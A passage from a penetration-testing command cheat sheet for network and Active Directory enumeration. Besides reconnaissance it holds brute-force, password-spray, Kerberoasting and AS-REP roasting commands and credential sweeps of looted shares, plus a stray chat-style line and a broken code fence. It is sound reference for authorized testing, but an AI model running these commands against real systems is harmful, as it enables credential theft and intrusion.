### 4.5 CMS scanning

**WordPress:**

```bash
# Basic enumeration
wpscan --url <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ --enumerate u,t,p

# Aggressive plugin detection
wpscan --url <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ --plugins-detection aggressive

# Full enumeration with API token
wpscan --url <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ --enumerate vp,vt,tt,cb,dbe,u,m \
  --plugins-detection aggressive --plugins-version-detection aggressive

# Brute force login
wpscan --url <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -U <USERNAME> -P /usr/share/wordlists/rockyou.txt

# Ignore SSL errors
wpscan --url https://<RHOST>:<RPORT>/ --disable-tls-checks --enumerate u,t,p
```

**Joomla:**

```bash
# Basic Joomla scan against the target
joomscan -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/

# Joomla scan with component enumeration
joomscan --ec -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/
```

**Drupal:**

```bash
# Droopescan
droopescan scan drupal -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/
```

**General CMS:**

```bash
# CMSmap tries to identify the CMS (WordPress, Joomla, Drupal, etc.)
cmsmap -F -d <HTTP_PROTOCOL>://<RHOST>:<RPORT>/
```

### 4.6 Web vulnerability scanning

**Nikto:**

```bash
# Nikto scan against the specified HTTP service
nikto -h <HTTP_PROTOCOL>://<RHOST>:<RPORT>/

# Nikto with max scan time and text output
nikto -h <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -maxtime 30m -o nikto_<RHOST>.txt

# Nikto with tuning and HTML report
nikto -h <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -Tuning 123bde -o report.html -Format htm

# Through proxy
nikto -useproxy <HTTP_PROTOCOL>://<PROXY_IP>:3128 -h <HTTP_PROTOCOL>://<RHOST>:<RPORT>/
```

---

## 5. SMB/NetBIOS Enumeration

### 5.1 Share listing

**Anonymous enumeration:**

```bash
# List SMB shares on the target using a null session
smbclient -L //<RHOST> -N

# List SMB shares on the target explicitly using an empty username and null session
smbclient -L //<RHOST>/ -U '' -N

# Enumerate shares/permissions on the target host
smbmap -H <RHOST>

# Enumerate shares/permissions using the username "anonymous"
smbmap -H <RHOST> -u anonymous

# Enumerate shares/permissions using empty username and empty password
smbmap -H <RHOST> -u '' -p ''

# Recursively list accessible directories/files across shares (can be noisy)
smbmap -H <RHOST> -R

# Attempt to connect to the IPC$ share with a null session
smbclient //<RHOST>/IPC$ -N

# Attempt to connect to the ADMIN$ share with a null session
smbclient //<RHOST>/ADMIN$ -N

# Attempt to connect to the C$ administrative share with a null session
smbclient //<RHOST>/C$ -N
```

**Authenticated enumeration:**

```bash
# Authenticated smbmap enumeration (user/pass)
smbmap -H <RHOST> -u '<USER>' -p '<PASS>'

# Authenticated smbmap enumeration with an explicit domain
smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -d <DOMAIN>

# Connect to a specific SMB share using user%pass syntax
smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'

# Recursive smbmap listing, limited to 5 levels deep
smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -R --depth 5
```

**Null session attempt:**

```bash
# Null session connect to RPC endpoint (no user, no password)
rpcclient -U "" -N <RHOST>

# Enumerate domain users via RPC using null session
rpcclient -U "" <RHOST> -N -c "enumdomusers"

# Enumerate domain groups via RPC using null session
rpcclient -U "" <RHOST> -N -c "enumdomgroups"
```

### 5.2 Permissions and content sweep

**In smbclient prompt:**

```bash
# Connect to the share (drops into smb: \> prompt)
smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'

# Enable recursive directory traversal for subsequent commands
smb: \> recurse ON

# Disable interactive prompts (useful for batch gets)
smb: \> prompt OFF

# List current directory contents (recursing if enabled)
smb: \> ls

# Download everything in the current directory (and subdirs if recurse ON)
smb: \> mget *
```

**On Kali after download:**

```bash
# Identify file types 
file *

# Quick string sweep for readable artifacts (min length 8)
strings -n 8 *

# Grep for common secret keywords (case-insensitive, recursive, with line numbers)
grep -RniE "pass|pwd|secret|token|key|cred" .

# Find common config/text files, then search for lines/files mentioning "password"
find . -name "*.txt" -o -name "*.xml" -o -name "*.ini" -o -name "*.conf" | xargs grep -l password
```

**Mount SMB share:**

```bash
# Create a local mountpoint for the SMB share
mkdir /tmp/share

# Mount SMB share interactively (may prompt for creds depending on target)
sudo mount -t cifs //<RHOST>/<SHARE> /tmp/share

# Mount SMB share with explicit credentials (non-interactive)
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<RHOST>/<SHARE> /tmp/share
```

### 5.3 Users/groups/OS

**Enum4linux:**

```bash
# Full enum4linux sweep; save output to a file
enum4linux -a <RHOST> | tee enum4linux_<RHOST>.txt

# Enumerate users
enum4linux -U <RHOST> 

# Enumerate groups
enum4linux -G <RHOST>

# Enumerate shares
enum4linux -S <RHOST>  
```

**Enum4linux-ng (updated):**

```bash
# enum4linux-ng comprehensive scan; output in multiple formats with prefix
enum4linux-ng -A <RHOST> -oA enum4linux_ng_<RHOST>
```

**Nmap SMB NSE scripts:**

```bash
# Nmap SMB scripts
nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-enum-groups,smb-security-mode <RHOST> -oA nmap_smb_<RHOST>

# Nmap comprehensive SMB enumeration
nmap -p 445 --script "smb-enum-*" <RHOST>

# Nmap SMB Version detection
nmap -p 139,445 --script smb-protocols <RHOST>
```

Here's the reformatted content with 2 NetExec examples and the rest using CrackMapExec:

### 5.4 NetExec/CrackMapExec enumeration

```bash
# Run NetExec (nxc alias) SMB module against the target (basic info + default checks)
nxc smb <RHOST>

# Run NetExec SMB module with null session
nxc smb <RHOST> -u '' -p ''

# Run CrackMapExec SMB module against the target
crackmapexec smb <RHOST>

# Authenticate to SMB and enumerate active SMB sessions on the target
crackmapexec smb <RHOST> -u '' -p '' --sessions

# Authenticate to SMB and enumerate users currently logged on to the target
crackmapexec smb <RHOST> -u '' -p '' --loggedon-users

# Spider shares for files
crackmapexec smb <RHOST> -u '' -p '' -M spider_plus

# Password spray
crackmapexec smb <RHOST> -u users.txt -p '' --continue-on-success
```

### 5.5 SMB vulnerability checks

```bash
# Check for EternalBlue (MS17-010) vulnerability
nmap -p 445 --script smb-vuln-ms17-010 <RHOST>

# Check for MS08-067 (NetAPI) SMB vulnerability
nmap -p 445 --script smb-vuln-ms08-067 <RHOST>

# Check for CVE-2017-7494 (Samba remote code execution via writable share)
nmap -p 445 --script smb-vuln-cve-2017-7494 <RHOST>

# Check for all SMB vulnerabilities
nmap -p 139,445 --script smb-vuln* <RHOST>

# Check signing (Nmap)
nmap -p 445 --script smb-security-mode <RHOST>

# Check signing (NetExec)
nxc smb <RHOST> --gen-relay-list relay.txt
```

---

## 6. NFS Enumeration

### 6.1 Detect RPC/NFS and list exports

```bash
# Scan common RPC/NFS ports and run rpcinfo NSE
nmap -p 111,2049,32769 --script rpcinfo <RHOST> -oA nmap_rpc_<RHOST>

# List RPC programs/versions/ports via portmapper
rpcinfo -p <RHOST>

# Quick RPC reachability/info check
rpcinfo <RHOST>

# List exported NFS filesystems
showmount -e <RHOST>

# Show clients and their mount points (if exposed)
showmount -a <RHOST>  

# Show only export directory names
showmount -d <RHOST>  

# Run NFS NSE scripts (list, exports, filesystem stats)
nmap -p 111 --script nfs-ls,nfs-showmount,nfs-statfs <RHOST>
```

### 6.2 Mount shares and verify access

```bash
# Create a local mount point directory
sudo mkdir -p /mnt/nfs/<RHOST>/<SHARE_NAME>

# Mount the NFS export with default settings
sudo mount -t nfs <RHOST>:/<EXPORT> /mnt/nfs/<RHOST>/<SHARE_NAME>

# Mount forcing NFSv3 and disabling locking (common for compatibility)
sudo mount -t nfs -o nolock,vers=3 <RHOST>:/<EXPORT> /mnt/nfs/<RHOST>/<SHARE_NAME>

# Mount forcing NFSv2 (legacy targets)
sudo mount -t nfs -o nolock,vers=2 <RHOST>:/<EXPORT> /mnt/nfs/<RHOST>/<SHARE_NAME>

# Confirm mounts and usage
df -h | grep nfs

# Confirm active NFS mounts (mount table)
mount | grep nfs
```

### 6.3 Search for sensitive data

```bash
# Basic listing
ls -la /mnt/nfs/<RHOST>/<SHARE_NAME>/

```bash
# Find sensitive file types
find /mnt/nfs/<RHOST>/<SHARE_NAME> \
  -name "*.pem" -o -name "*.key" -o -name "*.sql" -o -name "*.db" \
  -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null

# Find SSH keys
find /mnt/nfs/<RHOST>/<SHARE_NAME> -name "id_rsa*" -o -name "id_dsa*" -o -name "known_hosts" 2>/dev/null
```
```bash
# Find password files
find /mnt/nfs/<RHOST>/<SHARE_NAME> -name "*pass*" -o -name "*cred*" 2>/dev/null
```
```bash
# Grep for credentials
grep -rniE "password|passwd|pwd|secret|token|key" /mnt/nfs/<RHOST>/<SHARE_NAME>/ 2>/dev/null
```
```bash
# Find world-readable files
find /mnt/nfs/<RHOST>/<SHARE_NAME> -perm -004 -type f 2>/dev/null
```
```bash
# Find SUID binaries (for privesc)
find /mnt/nfs/<RHOST>/<SHARE_NAME> -perm -4000 -type f 2>/dev/null
```

### 6.4 no_root_squash / export misconfig checks

```bash
# Test if root_squash is disabled
sudo touch /mnt/nfs/<RHOST>/<SHARE_NAME>/test_root_squash
ls -la /mnt/nfs/<RHOST>/<SHARE_NAME>/test_root_squash

# If file is owned by root, no_root_squash is enabled (critical finding)
# Clean up
sudo rm /mnt/nfs/<RHOST>/<SHARE_NAME>/test_root_squash

# Unmount when done
sudo umount /mnt/nfs/<RHOST>/<SHARE_NAME>
```

---

## 7. LDAP/Directory Services Discovery

### 7.1 RootDSE and naming contexts

```bash
# Anonymous bind - base info
ldapsearch -x -h <RHOST> -s base
ldapsearch -x -h <RHOST> -s base namingcontexts
ldapsearch -x -H ldap://<RHOST> -s base

# Get supported controls
ldapsearch -x -h <RHOST> -s base supportedControl

# Get supported extensions
ldapsearch -x -h <RHOST> -s base supportedExtension

# Nmap LDAP scripts
nmap -p 389,636 --script ldap-rootdse <RHOST>
nmap -p 389,636 --script ldap-search <RHOST>
```

### 7.2 Enumerate directory objects

Adjust base DN from naming contexts discovered above.

```bash
# Enumerate users
ldapsearch -x -H ldap://<RHOST> -b "DC=<DOMAIN>,DC=local" "(objectClass=user)" sAMAccountName mail description memberOf
```
```bash
# Enumerate groups
ldapsearch -x -H ldap://<RHOST> -b "DC=<DOMAIN>,DC=local" "(objectClass=group)" cn member description
```
```bash
# Enumerate computers
ldapsearch -x -H ldap://<RHOST> -b "DC=<DOMAIN>,DC=local" "(objectClass=computer)" name operatingSystem operatingSystemVersion
```
```bash
# Get all objects
ldapsearch -x -h <RHOST> -b "dc=<DOMAIN>,dc=local" "*"
```
```bash
# Extract all DNs
ldapsearch -x -h <RHOST> -b "dc=<DOMAIN>,dc=local" "*" | awk '/dn: / {print $2}'
```
```bash
# With credentials
ldapsearch -x -H ldap://<RHOST> -D "<USER>@<DOMAIN>" -w '<PASS>' -b "DC=<DOMAIN>,DC=local" "(objectClass=user)"
```

**Using ldapdomaindump:**

```bash
# Dump AD LDAP domain objects using creds, target as host (defaults to LDAP)
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' <RHOST>

# Dump AD LDAP domain objects using creds, target explicitly via LDAP URI
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' ldap://<RHOST>
```

### 7.3 Confirm DCs and roles

Look for:

- SRV records in DNS
- LDAP `rootDomainNamingContext`
- Ports 53/88/389/445/464/636/3268 patterns
- OS banners

```bash
# Check for domain controller ports
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269 <RHOST>

# DNS SRV records for DC #1
dig _ldap._tcp.<DOMAIN> SRV

# DNS SRV records for DC #2
dig _kerberos._tcp.<DOMAIN> SRV
```

---

## 8. SNMP Enumeration

### 8.1 Community discovery

```bash
# Onesixtyone community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <RHOST>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <RHOST>

# Multiple hosts
onesixtyone -c community.txt -i hosts.txt

# snmp-check (public)
snmp-check <RHOST> -c public

# snmp-check (private)
snmp-check <RHOST> -c private

# Nmap SNMP brute force
nmap -sU -p 161 --script snmp-brute <RHOST>
```

### 8.2 Walk important OIDs

```bash
# SNMP walk version 1
snmpwalk -v1 -c public <RHOST>

# SNMP walk version 2c
snmpwalk -v2c -c public <RHOST>

# SNMP walk entire MIB tree
snmpwalk -v2c -c public <RHOST> .1

# System information OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.1

# Network interfaces OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.2.2 

# Running processes OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.25.4.2.1.2

# Host resources OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.25.1

# Installed software OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.25.6.3.1.2 

# Windows user accounts OID
snmpwalk -v1 -c public <RHOST> 1.3.6.1.4.1.77.1.2.25

# Windows domain OID
snmpwalk -v2c -c public <RHOST> 1.3.6.1.4.1.77.1.4.1

# Extended enumeration with snmp-check
snmp-check -v2c -c public <RHOST> -w

# Bulk get for faster enumeration
snmpbulkwalk -v2c -c public <RHOST>
```

**Extract specific info:**

```bash
# Get hostname
snmpget -v2c -c public <RHOST> 1.3.6.1.2.1.1.5.0

# Get system description
snmpget -v2c -c public <RHOST> 1.3.6.1.2.1.1.1.0

# Get uptime
snmpget -v2c -c public <RHOST> 1.3.6.1.2.1.1.3.0
```

---

## 9. DNS Enumeration

### 9.1 Zone transfers

```bash
# Get nameservers using dig
dig ns <DOMAIN> @<DNS_SERVER> +short

# Get nameservers using Cloudflare DNS
dig ns <DOMAIN> @1.1.1.1 +short

# Get nameservers using host
host -t ns <DOMAIN>

# Attempt zone transfer with dig
dig axfr <DOMAIN> @<NS_SERVER>

# Attempt zone transfer alternate syntax
dig axfr @<DNS_SERVER> <DOMAIN>

# Attempt zone transfer with host
host -l <DOMAIN> <NS_SERVER>

# Loop through all nameservers for zone transfer
for ns in $(dig ns <DOMAIN> +short); do
  echo "Trying AXFR against $ns"
  dig axfr <DOMAIN> @$ns
done

# Zone transfer using dnsrecon
dnsrecon -d <DOMAIN> -t axfr
```

### 9.2 Subdomain enumeration

**Wordlist brute force:**

```bash
# Gobuster DNS enumeration
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -o dns_gobuster_<DOMAIN>.txt

# DNSrecon brute force
dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt

# Fierce subdomain scanner
fierce --domain <DOMAIN>

# Fierce with custom DNS server
fierce --domain <DOMAIN> --dns-servers <DNS_SERVER>

# Wfuzz DNS fuzzing
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "<HTTP_PROTOCOL>://<DOMAIN>" -H "Host: FUZZ.<DOMAIN>" --hc 404
```

**OSINT/passive:**

```bash
# Sublist3r passive enumeration
sublist3r -d <DOMAIN> -o subdomains_<DOMAIN>.txt

# Amass passive enumeration
amass enum -passive -d <DOMAIN> -o amass_passive.txt

# DNSrecon comprehensive scan
dnsrecon -d <DOMAIN> -a -z -s -b -r 8.8.8.8
```

### 9.3 Record sweep

```bash
# Query all common DNS record types
for type in A AAAA MX TXT SOA NS SRV CNAME PTR; do
  echo "=== $type ==="
  dig $type <DOMAIN> +short
done

# Query all record types
dig <DOMAIN> ANY +noall +answer

# Get MX records
dig <DOMAIN> MX +short

# Get TXT records
dig <DOMAIN> TXT +short

# Get MX records with host
host -t mx <DOMAIN>

# Get TXT records with host
host -t txt <DOMAIN>

# Reverse DNS lookup
dig -x <IP_ADDRESS>

# Reverse DNS with host
host <IP_ADDRESS>

# Check SPF record
dig txt <DOMAIN> | grep "v=spf"

# Check DMARC record
dig txt _dmarc.<DOMAIN>
```

---

## 10. FTP Enumeration

### 10.1 Anonymous login check

```bash
# Automated anonymous login check with nmap
nmap -p 21 --script ftp-anon <RHOST>

# Anonymous login with lftp
lftp <RHOST>
```

### 10.2 Version and vulnerability check

```bash
# Banner grab with netcat
nc -nv <RHOST> 21

# Version detection with nmap
nmap -sV -p 21 <RHOST>

# FTP enumeration scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor <RHOST>

# FTP vulnerability scan
nmap -p 21 --script ftp-vuln* <RHOST>

# Search for vsftpd exploits
searchsploit vsftpd

# Search for proftpd exploits
searchsploit proftpd
```

### 10.3 File enumeration

```bash
# Recursive download with wget
wget -r ftp://anonymous:anonymous@<RHOST>/

# Mirror FTP directory
wget -m --no-passive ftp://anonymous:anonymous@<RHOST>/
```

---

## 11. SSH Enumeration

### 11.1 Version and algorithm enumeration

```bash
# SSH banner grab with netcat
nc -nv <RHOST> 22

# SSH banner grab with telnet
telnet <RHOST> 22

# SSH version detection
nmap -sV -p 22 <RHOST>

# Enumerate SSH algorithms
nmap -p 22 --script ssh2-enum-algos <RHOST>

# Get SSH host key
nmap -p 22 --script ssh-hostkey <RHOST>

# SSH key scan
ssh-keyscan <RHOST>
```

### 11.2 Authentication methods

```bash
# Check authentication methods
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 <RHOST>

# Verbose authentication check
ssh -v <RHOST> 2>&1 | grep "Authentications that can continue"

# Nmap authentication methods scan
nmap -p 22 --script ssh-auth-methods <RHOST>

# Public key acceptance test
nmap -p 22 --script ssh-publickey-acceptance <RHOST>
```

### 11.3 Brute force (if applicable)

```bash
# Hydra SSH single user
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<RHOST>

# Hydra SSH user and password lists
hydra -L users.txt -P passwords.txt ssh://<RHOST> -t 4

# Medusa SSH brute force
medusa -h <RHOST> -u <USER> -P /usr/share/wordlists/rockyou.txt -M ssh

# NetExec SSH brute force
nxc ssh <RHOST> -u <USER> -p /usr/share/wordlists/rockyou.txt
```

---

## 12. SMTP Enumeration

### 12.1 User enumeration

```bash
# SMTP connection with netcat
nc -nv <RHOST> 25

# SMTP connection with telnet
telnet <RHOST> 25

# SMTP enumeration scripts
nmap -p 25 --script smtp-commands,smtp-enum-users <RHOST>

# SMTP user enumeration with multiple methods
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <RHOST>

# SMTP user enum with VRFY
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <RHOST>

# SMTP user enum with EXPN
smtp-user-enum -M EXPN -U users.txt -t <RHOST>

# SMTP user enum with RCPT
smtp-user-enum -M RCPT -U users.txt -D <DOMAIN> -t <RHOST>
```

### 12.2 Open relay check

```bash
# Nmap open relay check
nmap -p 25 --script smtp-open-relay <RHOST>
```

---

## 13. POP3/IMAP Enumeration

### 13.1 Banner and capabilities

```bash
# POP3 connection with netcat
nc -nv <RHOST> 110

# POP3 connection with telnet
telnet <RHOST> 110

# POP3S secure connection
openssl s_client -connect <RHOST>:995 -quiet

# IMAP connection with netcat
nc -nv <RHOST> 143

# IMAP connection with telnet
telnet <RHOST> 143

# IMAPS secure connection
openssl s_client -connect <RHOST>:993 -quiet

# Nmap POP3/IMAP capabilities
nmap -p 110,143,993,995 --script pop3-capabilities,imap-capabilities <RHOST>
```

### 13.2 Authentication and enumeration

```bash
# Hydra POP3 brute force
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <RHOST> pop3

# Hydra IMAP brute force
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <RHOST> imap
```

---

## 14. RPC Enumeration

### 14.1 RPC service enumeration

```bash
# List RPC services detailed
rpcinfo -p <RHOST>

# List RPC services
rpcinfo <RHOST>

# Nmap RPC enumeration
nmap -p 111 --script rpcinfo <RHOST>

# Nmap RPC with version detection
nmap -sV -p 111 --script=rpcinfo <RHOST>
```

### 14.2 RPC client enumeration

```bash
# Connect with null session
rpcclient -U "" -N <RHOST>

# Enumerate domain users one-liner
rpcclient -U "" <RHOST> -N -c "enumdomusers" 2>/dev/null

# Enumerate domain groups one-liner
rpcclient -U "" <RHOST> -N -c "enumdomgroups" 2>/dev/null

# RPC enumeration with credentials
rpcclient -U '<USER>%<PASS>' <RHOST> -c "enumdomusers"
```

---

## 15. Database Enumeration

### 15.1 MSSQL enumeration

```bash
# Nmap MSSQL info script
nmap -p 1433 --script ms-sql-info <RHOST>

# Nmap MSSQL config script
nmap -p 1433 --script ms-sql-config <RHOST>

# Nmap MSSQL empty password check
nmap -p 1433 --script ms-sql-empty-password <RHOST>

# Nmap MSSQL NTLM info
nmap -p 1433 --script ms-sql-ntlm-info <RHOST>

# Nmap MSSQL brute force
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <RHOST>

# Impacket mssqlclient Windows auth
impacket-mssqlclient <USER>@<RHOST> -windows-auth

# Impacket mssqlclient with credentials
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<RHOST>

# sqsh MSSQL client
sqsh -S <RHOST> -U <USER> -P <PASS>

# NetExec MSSQL authentication
nxc mssql <RHOST> -u <USER> -p <PASS>

# NetExec MSSQL query execution
nxc mssql <RHOST> -u <USER> -p <PASS> -q "SELECT name FROM master.dbo.sysdatabases"
```

### 15.2 MySQL enumeration

```bash
# MySQL connection with password
mysql -h <RHOST> -u root -p

# MySQL connection without password
mysql -h <RHOST> -u root

# Nmap MySQL info script
nmap -p 3306 --script mysql-info <RHOST>

# Nmap MySQL empty password check
nmap -p 3306 --script mysql-empty-password <RHOST>

# Nmap MySQL enumeration
nmap -p 3306 --script mysql-enum <RHOST>

# Nmap MySQL brute force
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <RHOST>
```

### 15.3 PostgreSQL enumeration

```bash
# PostgreSQL connection
psql -h <RHOST> -U <USER> -d <DATABASE>

# Nmap PostgreSQL brute force
nmap -p 5432 --script pgsql-brute <RHOST>
```

---

## 16. RDP/VNC Enumeration

### 16.1 RDP enumeration

```bash
# Nmap RDP encryption enumeration
nmap -p 3389 --script rdp-enum-encryption <RHOST>

# Nmap RDP NTLM info
nmap -p 3389 --script rdp-ntlm-info <RHOST>

# Nmap RDP MS12-020 vulnerability check
nmap -p 3389 --script rdp-vuln-ms12-020 <RHOST>

# RDP connection with rdesktop
rdesktop <RHOST>

# RDP connection with xfreerdp
xfreerdp /v:<RHOST> /u:<USER> /p:<PASS>

# RDP connection ignoring certificate
xfreerdp /v:<RHOST> /u:<USER> /p:<PASS> /cert:ignore

# Hydra RDP brute force
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<RHOST>

# NetExec RDP brute force
nxc rdp <RHOST> -u <USER> -p /usr/share/wordlists/rockyou.txt
```

### 16.2 VNC enumeration

```bash
# Nmap VNC info script
nmap -p 5900 --script vnc-info <RHOST>

# Nmap VNC brute force
nmap -p 5900 --script vnc-brute <RHOST>

# VNC connection with display
vncviewer <RHOST>:<DISPLAY>

# VNC connection on port 5900
vncviewer <RHOST>::5900

# Hydra VNC brute force
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt vnc://<RHOST>
```

---
### 17 Active Directory Enumeration

### 17.1 Domain Enumeration

#### Linux
```bash
# Basic domain info
nxc smb <DC_IP>
nxc smb <DC_IP> --pass-pol

# LDAP enumeration
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local'

# Domain SID
rpcclient -U '<USER>%<PASS>' <DC_IP> -c "lsaquery"
impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP>

# Find domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
```

#### Windows
```powershell
# PowerShell
Get-ADDomain
Get-ADForest
Get-ADDomainController -Filter *
Get-ADTrust -Filter *
Get-ADDefaultDomainPasswordPolicy

# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainTrust
Get-DomainPolicy
```

---

### 17.2 User and Group Enumeration

#### Linux
```bash
# Enumerate users
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --users
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --rid-brute
impacket-GetADUsers -all '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>

# Enumerate groups
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --groups
rpcclient -U '<USER>%<PASS>' <DC_IP> -c "enumdomgroups"

# Find privileged users
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(adminCount=1)' sAMAccountName

# Enum4linux
enum4linux -a <DC_IP>
enum4linux -u '<USER>' -p '<PASS>' -a <DC_IP>
```

#### Windows
```powershell
# PowerShell
Get-ADUser -Filter * | Select Name,SamAccountName,Enabled
Get-ADUser -Filter {adminCount -eq 1}
Get-ADGroup -Filter * | Select Name
Get-ADGroupMember "Domain Admins" -Recursive

# PowerView
Get-DomainUser
Get-DomainUser | Select samaccountname,description,pwdlastset
Get-DomainUser -AdminCount
Get-DomainUser -SPN  # Kerberoastable users
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
Get-DomainComputer
Get-DomainComputer -Ping
```

---

### 17.3 Kerberos Enumeration

#### Linux
```bash
# User enumeration
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt

# Password spray
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASSWORD>'

# AS-REP roasting (no creds)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat

# AS-REP roasting (with creds)
impacket-GetNPUsers '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request

# Kerberoasting
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# Get TGT
impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache
```

#### Windows
```powershell
# Rubeus AS-REP roasting
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Rubeus Kerberoasting
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt

# PowerView
Invoke-Kerberoast -OutputFormat Hashcat | fl
Get-DomainUser -SPN | Invoke-Kerberoast

# Find AS-REP roastable users
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
Get-DomainUser -PreauthNotRequired

# Find Kerberoastable users
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}
setspn -Q */*
```

---

### 17.4 Share Enumeration

#### Linux
```bash
# Basic share enum
nxc smb <RHOST> -u '<USER>' -p '<PASS>' --shares
nxc smb <NETWORK>/24 -u '<USER>' -p '<PASS>' --shares

# Spider shares
nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M spider_plus

# SMBMap
smbmap -H <RHOST> -u '<USER>' -p '<PASS>'
smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -R <SHARE>

# SMBClient
smbclient -L //<RHOST> -U '<USER>%<PASS>'
smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'
```

#### Windows
```powershell
# Native
net view \\<HOSTNAME>
dir \\<HOSTNAME>\<SHARE>

# PowerView
Invoke-ShareFinder
Invoke-ShareFinder -CheckShareAccess
Invoke-FileFinder
Find-InterestingDomainShareFile

# Find sensitive files
Get-ChildItem -Path "\\<HOSTNAME>\<SHARE>" -Recurse -Include *.txt,*.xml,*.config,*.ini,*.kdbx
```

---

### 17.5 BloodHound / SharpHound
[Quick Start BloodHound CE](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

#### Linux - BloodHound Python
```bash
# Standard auth - full collection
bloodhound-python -c All -u <USER> -p <PASS> -d <DOMAIN> -dc <DC_HOSTNAME> -ns <DNS_IP>

# Kerberos auth (requires -k and env var)
bloodhound-python -c All -u <USER> -p '' -k -d <DOMAIN> -dc <DC_HOSTNAME> -ns <DNS_IP>

# DC only - faster and stealthier
bloodhound-python -c DCOnly -u <USER> -p <PASS> -d <DOMAIN> -dc <DC_HOSTNAME> -ns <DNS_IP>

# Specific collection methods
bloodhound-python -c Group,LocalAdmin,Session,Trusts -u <USER> -p <PASS> -d <DOMAIN> -ns <DNS_IP>
```

#### Windows - SharpHound
```powershell
# Standard collection (JSON output for CE)
.\SharpHound.exe -c All --outputdirectory C:\Temp
# Fast collection (no session enumeration)
.\SharpHound.exe -c DCOnly
# Specific collection methods
.\SharpHound.exe -c Session,LoggedOn
.\SharpHound.exe -c Group,LocalAdmin,Trusts
# Loop collection (for sessions)
.\SharpHound.exe -c All --Loop --Loopduration 02:00:00
# Stealth collection
.\SharpHound.exe -c All --Stealth
# Domain specification
.\SharpHound.exe -c All -d  --outputdirectory C:\Temp
```


#### PowerView ACL Analysis
```powershell
# Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs

# Get ACL for specific user
Get-DomainObjectAcl -SamAccountName <USER> -ResolveGUIDs

# Find GenericAll/WriteDacl/WriteOwner permissions
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# Find DCSync rights
Get-DomainObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectType -match "replication"}

# Find who can modify GPO
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite"}
```

---

